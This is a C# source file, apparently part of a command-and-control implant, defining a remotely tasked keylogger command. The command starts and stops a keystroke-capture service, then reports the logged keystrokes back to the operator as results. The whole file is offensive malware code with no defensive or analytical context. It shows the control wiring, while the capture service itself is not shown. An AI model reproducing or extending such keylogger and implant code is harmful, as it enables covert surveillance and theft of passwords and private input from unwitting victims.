using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using Agent.Models;
using System.Diagnostics;
using Agent.Service;
using Agent.Commands.Services;
using Shared;

namespace Agent.Commands
{
    public class KeyLoggerCommand : RunningServiceCommand<IKeyLogService>
    {
        public override CommandId Command => CommandId.KeyLog;

        protected override async Task Start(AgentTask task, AgentCommandContext context)
        {
            if (this.Service.Status == RunningService.RunningStatus.Running)
            {
                context.AppendResult("Key Logger is already running!");
                return;
            }

            this.Service.Start();
            context.AppendResult($"Key Logger started");
        }

        protected override async Task Stop(AgentTask task, AgentCommandContext context)
        {
            if (this.Service.Status != RunningService.RunningStatus.Running)
            {
                context.AppendResult("Key Logger is not running!");
                return;
            }

            this.Service.Stop();
            context.AppendResult("Key Logger stopped : " + Environment.NewLine);
            context.AppendResult(this.Service.LoggedKeyStrokes);
        }

        protected override async Task Show(AgentTask task, AgentCommandContext context)
        {
            if (this.Service.Status == RunningService.RunningStatus.Running)
            {
                context.AppendResult("Key Logger is running!");
                context.AppendResult(this.Service.LoggedKeyStrokes);
            }
            else
                context.AppendResult("Key Logger is stopped!");
            return;
        }
    }
}
